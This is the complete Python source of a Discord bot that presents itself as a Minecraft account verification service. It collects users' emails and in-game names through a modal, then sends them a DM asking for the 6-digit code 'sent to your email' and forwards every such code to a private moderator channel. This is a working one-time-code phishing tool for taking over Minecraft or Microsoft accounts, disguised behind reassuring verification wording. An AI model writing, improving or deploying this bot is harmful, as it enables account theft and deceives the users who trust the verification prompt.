import os
import discord
from discord.ext import commands

TOKEN = os.getenv("DISCORD_TOKEN")
VERIFICATION_CHANNEL_ID = 1362951881827160295
MOD_CHANNEL_ID = 1362997933552959558

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.dm_messages = True

bot = commands.Bot(command_prefix="!", intents=intents)

sent_verification_dms = set()
sent_invalid_codes = set()
last_verification_msg_id = None

class VerifyModal(discord.ui.Modal, title="Link Your Minecraft Account"):
    email = discord.ui.TextInput(label="Email")
    ign = discord.ui.TextInput(label="IGN")

    async def on_submit(self, interaction: discord.Interaction):
        log = await bot.fetch_channel(MOD_CHANNEL_ID)
        embed = discord.Embed(title="New Verification", color=discord.Color.orange())
        embed.add_field(name="User", value=interaction.user.mention, inline=False)
        embed.add_field(name="Email", value=self.email.value, inline=False)
        embed.add_field(name="IGN", value=self.ign.value, inline=False)
        await log.send(embed=embed)
        await interaction.response.send_message("✅ Submitted!", ephemeral=True)

class LinkView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.primary)
    async def link(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(VerifyModal())

async def send_verification_embed():
    global last_verification_msg_id
    channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)

    if last_verification_msg_id:
        try:
            old = await channel.fetch_message(last_verification_msg_id)
            await old.delete()
        except:
            pass

    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the button below to verify.",
        color=discord.Color.green()
    )
    msg = await channel.send(embed=embed, view=LinkView())
    last_verification_msg_id = msg.id

@bot.event
async def on_ready():
    print(f"Bot is ready: {bot.user}")
    await bot.tree.sync()
    await send_verification_embed()

@bot.tree.command(name="setup")
async def setup(interaction: discord.Interaction):
    await send_verification_embed()
    await interaction.response.send_message("✅ Sent!", ephemeral=True)

@bot.tree.command(name="promptcode")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    if user.id in sent_verification_dms:
        await interaction.response.send_message("Already sent.", ephemeral=True)
        return
    try:
        embed = discord.Embed(
            title="📨 Minecraft Server Verification",
            description=(
                "We've sent a 6-digit code to your email linked to Minecraft.\n\n"
                "Reply to this DM with the code to complete verification.\n\n"
                "🔒 Your info is private. Don't share your code."
            ),
            color=discord.Color.blue()
        )
        await user.send(embed=embed)
        sent_verification_dms.add(user.id)
        await interaction.response.send_message("✅ Prompt sent.", ephemeral=True)
    except:
        await interaction.response.send_message("❌ Couldn't send DM.", ephemeral=True)

@bot.event
async def on_message(message: discord.Message):
    if message.author.bot:
        return

    # Only handle DMs
    if isinstance(message.channel, discord.DMChannel):
        user_id = message.author.id
        content = message.content.strip()

        if content.isdigit() and len(content) == 6:
            # Valid code
            mod = await bot.fetch_channel(MOD_CHANNEL_ID)
            embed = discord.Embed(
                title="✅ Code Submitted",
                description=f"User: {message.author.mention}\nCode: `{content}`",
                color=discord.Color.teal()
            )
            await mod.send(embed=embed)
            await message.channel.send("✅ Code received. A mod will review it.")

            # Reset invalid tracker so they can re-send a code later
            if user_id in sent_invalid_codes:
                sent_invalid_codes.remove(user_id)

        else:
            # Only send the invalid code message once
            if user_id not in sent_invalid_codes:
                embed = discord.Embed(
                    title="❌ Invalid Code",
                    description="Please enter a **6-digit code**.",
                    color=discord.Color.red()
                )
                await message.channel.send(embed=embed)
                sent_invalid_codes.add(user_id)

    await bot.process_commands(message)

bot.run(TOKEN)
